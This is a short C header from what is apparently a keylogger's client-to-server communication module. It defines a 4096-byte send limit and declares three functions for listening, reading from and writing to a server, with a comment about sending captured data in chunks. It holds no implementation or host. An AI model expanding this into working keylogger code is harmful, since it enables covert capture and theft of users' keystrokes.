#ifndef KEYLOGGER_CLIENTCOM_H_INCLUDED
#define KEYLOGGER_CLIENTCOM_H_INCLUDED

/*
    this is the max length in bytes to send at a time,
    the server will reject any data beyond this capacity
    processes that are captured and contain more then the allocated
    data will be sent in multiple passes.
*/
#define MAXSENDDATA 4096
bool startListeningClient();
bool ReadFromServer();
bool WriteToServer(char* buffer);

#endif // KEYLOGGER_CLIENTCOMUNICATION_H_INCLUDED
